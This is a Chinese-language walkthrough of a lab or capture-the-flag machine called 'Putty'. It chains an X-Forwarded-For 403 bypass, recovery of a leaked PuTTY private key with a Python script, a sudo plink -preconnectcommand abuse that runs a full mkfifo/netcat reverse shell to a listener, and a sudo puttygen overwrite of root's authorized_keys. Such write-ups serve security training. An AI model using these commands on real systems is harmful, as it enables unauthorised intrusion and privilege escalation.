## Nmap

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.218
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-09 21:19 -0400
Nmap scan report for 192.168.205.218
Host is up (0.0010s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:96:BC:76 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 5.06 seconds
```

只有 `22/80`，先看 Web。

## Web

访问首页是一个静态模板页：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.218
<!DOCTYPE html>
<html lang="en">
...
<title>dprod - Digital product design agency</title>
...
Copyright 2026 All Rights Reserved by ADITYA RAJ.
...
</html>
```

页面本身没有可交互点，更像是障眼法。

目录扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -q -u 192.168.205.218
[21:19:18] 403 -  318B  - http://192.168.205.218/jsp.zip
[21:19:18] 403 -  318B  - http://192.168.205.218/html.zip
[21:19:18] 403 -  318B  - http://192.168.205.218/aspx.zip
[21:19:18] 403 -  318B  - http://192.168.205.218/php.zip
[21:19:18] 403 -  318B  - http://192.168.205.218/js.zip
...
[21:19:23] 301 -  357B  - http://192.168.205.218/assets  ->  http://192.168.205.218/assets/
[21:19:23] 200 -  431B  - http://192.168.205.218/assets/
[21:19:24] 200 -  820B  - http://192.168.205.218/cgi-bin/printenv
[21:19:24] 200 -    1KB - http://192.168.205.218/cgi-bin/test-cgi
[21:19:30] 403 -  318B  - http://192.168.205.218/server-status/
```

这里的两个异常点是：

```text
1. /cgi-bin/printenv 和 /cgi-bin/test-cgi 存在
2. 大量 *.zip 返回 403
```

`.zip` 这类统一 403 很像“存在但禁止外部访问”。

继续用 gobuster 也能看到同样现象：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.218 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,clearhtml,zip,db,bak,js -t 64 -k -b 404
===============================================================
Gobuster v3.8.2
===============================================================
index.zip            (Status: 403) [Size: 318]
images.zip           (Status: 403) [Size: 318]
download.zip         (Status: 403) [Size: 318]
...
1.zip                (Status: 403) [Size: 318]
...
```

说明 `.zip` 路径值得继续挖。

## 403 bypass

先对一个 403 路径做绕过探测：

```bash
┌──(kali㉿kali)-[~/go/bin]
└─$ nomore403 -u http://192.168.205.218/.zip -r
━━━━━━━━━━━━━━━━━━━━━━ NOMORE403 ━━━━━━━━━━━━━━━━━━━━━━━
  Target: http://192.168.205.218/.zip
...
━━━━━━━━━━━━━━━ DEFAULT REQUEST ━━━━━━━━━━━━━━
403       318 bytes http://192.168.205.218/.zip

━━━━━━━━━━━━━━━━━━ HEADERS ━━━━━━━━━━━━━━━━━━━
404       315 bytes X-Forwarded-For: 127.0.0.1

━━━━━━━━━━━━━━━ CUSTOM PATHS ━━━━━━━━━━━━━━━━
200     27045 bytes http://192.168.205.218/.zip/..
200     27045 bytes http://192.168.205.218///?anything.zip
200     27045 bytes http://192.168.205.218/?.zip
```

最关键的是：

```text
X-Forwarded-For: 127.0.0.1
```

默认 403，但伪造为本地来源后响应行为变化，说明后端信任这个头。

因此重新爆破 `.zip`：

```bash
┌──(kali㉿kali)-[~/go/bin]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u 'http://192.168.205.218/FUZZ.zip' -H 'X-Forwarded-For: 127.0.0.1' --fw 12852

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

________________________________________________

1                       [Status: 200, Size: 2383, Words: 8, Lines: 16]
```

发现 `1.zip`。

下载时直接带头：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl -H "X-Forwarded-For: 127.0.0.1" http://192.168.205.218/1.zip -o 1.zip
```

解压：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ unzip 1.zip
Archive:  1.zip
   creating: backup_web/
  inflating: backup_web/key.ppk
```

得到一个 PuTTY 私钥文件 `key.ppk`。

## PPK

查看内容：

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/backup_web]
└─$ cat key.ppk
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: brendon
Public-Lines: 12
AAAAB3NzaC1yc2EAAAADAQABAAACAQC20DOGUv1JrvtV8ROj8QNhEtUGtNthRkH3
...
Private-Lines: 28
AAACAAQFQtzVaRSnGzKiAViTAwwDf1k3vmC+oXzIs/TXfwapckf90iHSDcLXKOSj
...
Private-MAC: 6c08d7ea1b26b22ac8732488410d63f14fb14ddeffd817bc7cfda1d2e311444d
```

这里先记住两个点：

```text
1. Comment: brendon
2. Encryption: none
```

用户名基本已经给出来了：`brendon`。

按理说无加密 PPK 可以直接转 OpenSSH，但实际 `puttygen` 报错：

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/backup_web]
└─$ puttygen key.ppk -O private-openssh -o id_rsa
puttygen: error loading `key.ppk': MAC failed
```

`putty2john` 也说明这不是口令问题：

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/backup_web]
└─$ putty2john key.ppk > hash
key.ppk : this private key doesn't need a passphrase!
```

所以不是需要爆破，而是这个 PPK 的 MAC 校验异常，但密钥数据主体本身还在。

先确认公钥可读：

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/backup_web]
└─$ puttygen key.ppk -L
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC20DOGUv1JrvtV8ROj8QNhEtUGtNthRkH33RUdRKdW/vvBf4xehfbsRVcc4EQwFEGG8uL4DH2bxWno68JDK7lNOQapAr5RYgiqBed3XlgFhxlaAdvV9qXC7V5VdHvaD37DtRE+5Emk4/u2sFvaMKfROb8/9ke3o+F3hpZGYczUErxsX+y4Wx5psIn3i/QMs8gYQ1swtm0IaPal2g/GreP9B3KXhe/NcXimPF5LszSIhi54j1rkh5LFeRRu/LcCVdF7a7C9/ghQauwLONDpufDC3Wl/rOvZnBgal1WQ4r+pTfPes1btowRzno+5fIFmmCJWZvR2qC8C0yQC9zI0dUx7sR9Z+2/54sWYYdO3HPrQaHlCCIB+i8wBlwktYZfZP/cwReB8N52L6bNoL/UBbOWKcAQkPHV+BMXhWbMv1Pmf0VB2COWrY3FmgpEQV7ICgftnKYSiSUdQg8NKP9KJO0nDg7k+F1ekTi48Dbno305L117eUYO8nShuR/4NSfHPJ81QDPI7TK4r2X4E9s3sl9WTb5wsNckd3HH/TxG/SZTtt9q5iBoJiKDCI2FIXr9Bx+Xp7yTw72hQe31qzfaaAtdMc2OvxVkUAkAHrHsrVUAtr94dJ5Sjzf7y2hIGr443dK3TK37s5QZRs8Ggf05IROaFh9EZRApJHU12IEx3zQ2PHw== brendon
```

## SSH key recovery

直接手动解析 PPK v3 中的 RSA 参数，重新组装成 PEM 私钥。

```python
import struct
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

with open('key.ppk','r') as f:
    lines = f.readlines()

priv_start = [i for i,l in enumerate(lines) if 'Private-Lines:' in l][0]
priv_end = [i for i,l in enumerate(lines) if 'Private-MAC:' in l][0]
priv_b64 = ''.join([l.strip() for l in lines[priv_start+1:priv_end]])
priv_data = base64.b64decode(priv_b64)

def parse_ssh_str(data, offset):
    length = struct.unpack('>I', data[offset:offset+4])[0]
    return data[offset+4:offset+4+length], offset+4+length

offset = 0
d_bytes, offset = parse_ssh_str(priv_data, offset)
p_bytes, offset = parse_ssh_str(priv_data, offset)
q_bytes, offset = parse_ssh_str(priv_data, offset)
iqmp_bytes, offset = parse_ssh_str(priv_data, offset)

pub_start = [i for i,l in enumerate(lines) if 'Public-Lines:' in l][0]
pub_end = priv_start
pub_b64 = ''.join([l.strip() for l in lines[pub_start+1:pub_end]])
pub_data = base64.b64decode(pub_b64)

offset = 0
algo, offset = parse_ssh_str(pub_data, offset)
e_bytes, offset = parse_ssh_str(pub_data, offset)
n_bytes, offset = parse_ssh_str(pub_data, offset)

d = int.from_bytes(d_bytes, 'big')
p = int.from_bytes(p_bytes, 'big')
q = int.from_bytes(q_bytes, 'big')
e = int.from_bytes(e_bytes, 'big')
n = int.from_bytes(n_bytes, 'big')

key = rsa.RSAPrivateNumbers(
    p=p, q=q, d=d,
    dmp1=d % (p-1),
    dmq1=d % (q-1),
    iqmp=int.from_bytes(iqmp_bytes, 'big'),
    public_numbers=rsa.RSAPublicNumbers(e=e, n=n)
).private_key(default_backend())

pem = key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
)

with open('id_rsa','wb') as f:
    f.write(pem)
```

运行：

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/backup_web]
└─$ python3 a.py
```

生成的 `id_rsa` 是正常 PEM：

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/backup_web]
└─$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEAttAzhlL9Sa77VfETo/EDYRLVBrTbYUZB990VHUSnVv77wX+M
...
-----END RSA PRIVATE KEY-----
```

然后 SSH 登录：

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/backup_web]
└─$ chmod 600 id_rsa
└─$ ssh -i id_rsa brendon@192.168.205.218
              _
__      _____| | ___ ___  _ __ ___   ___
\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
 \ V  V /  __/ | (_| (_) | | | | | |  __/
  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|

brendon@Putty:~$ id
uid=1000(brendon) gid=1000(brendon) groups=1000(brendon)
```

成功拿到 `brendon`。

## Sudo

先看 sudo：

```bash
brendon@Putty:~$ sudo -l
Matching Defaults entries for brendon on Putty:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for brendon:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User brendon may run the following commands on Putty:
    (rosers) NOPASSWD: /usr/bin/plink
```

也就是 brendon 可以无密码以 `rosers` 身份运行 `plink`。

一开始如果只看常见思路，可能会去试 `-m`、`-proxycmd`、`-preconnectcommand`。
这里真正有用的是 `-preconnectcommand`，因为它会在 SSH 连接建立前执行本地命令。

先验证这一点：

```bash
brendon@Putty:~$ sudo -u rosers /usr/bin/plink -ssh 127.0.0.1 -preconnectcommand "id"
The host key is not cached for this server:
  127.0.0.1 (port 22)
You have no guarantee that the server is the computer you
think it is.
The server's ssh-ed25519 key fingerprint is:
  ssh-ed25519 255 SHA256:xJ90oWmr5sPR2afHz9etzSdtxINmLI+JvbwgV/iCsWY
If you trust this host, enter "y" to add the key to Plink's
cache and carry on connecting.
If you want to carry on connecting just once, without adding
the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n, Return cancels connection, i for more info) y
Using username "rosers".
rosers@127.0.0.1's password:
```

虽然连接阶段还是会要求 rosers 的 SSH 密码，但 `preconnectcommand` 已经先执行了。
这说明我们实际上已经拿到了 **以 rosers 身份执行任意本地命令** 的能力。

比如直接反弹 shell：

本地监听：

```bash
nc -lvnp 8888
```

目标机执行：

```bash
brendon@Putty:~$ sudo -u rosers /usr/bin/plink -ssh 127.0.0.1 -preconnectcommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc 192.168.205.128 8888 >/tmp/f"
```

这时即使 plink 后续继续走 SSH 认证流程，反弹 shell 已经出来了。

监听端可收到 rosers shell：

```bash
$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.218] 53124
/bin/sh: can't access tty; job control turned off
rosers@Putty:/home/brendon$ id
uid=1001(rosers) gid=1001(rosers) groups=1001(rosers)
```

所以这里正确的链路不是“用 plink 登录 rosers”，而是：

```text
借助 sudo 运行 plink
-> 利用 preconnectcommand 先执行本地命令
-> 直接拿 rosers shell
```

## Rosers

拿到 rosers shell 后看 sudo：

```bash
rosers@Putty:/home/brendon$ sudo -l
Matching Defaults entries for rosers on Putty:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for rosers:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User rosers may run the following commands on Putty:
    (ALL) NOPASSWD: /usr/bin/puttygen
```

这就很直接了：

```text
rosers 可以无密码 sudo 执行 /usr/bin/puttygen
```

## Root

思路是写 root 的 SSH 认证文件。
先在目标机生成自己的密钥：

```bash
rosers@Putty:/tmp$ ssh-keygen -t rsa -f /tmp/r -N ''
Generating public/private rsa key pair.
Your identification has been saved in /tmp/r
Your public key has been saved in /tmp/r.pub
```

然后用 sudo puttygen 把公钥写入 root 的 `authorized_keys`：

```bash
rosers@Putty:/tmp$ sudo /usr/bin/puttygen /tmp/r.pub -o /root/.ssh/authorized_keys -O public-openssh
```

为了稳一点，也可以顺手把私钥转一份到 root 目录，不过其实不是必须：

```bash
rosers@Putty:/tmp$ sudo /usr/bin/puttygen /tmp/r -o /root/.ssh/id_rsa -O private-openssh
```

然后本地登录 root：

```bash
rosers@Putty:/tmp$ ssh -i /tmp/r root@localhost
              _
__      _____| | ___ ___  _ __ ___   ___
\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
 \ V  V /  __/ | (_| (_) | | | | | |  __/
  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|

root@Putty:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

成功提权到 root。

读取 flag：

```bash
root@Putty:~# cat /root/root.txt
flag{root-md5}
```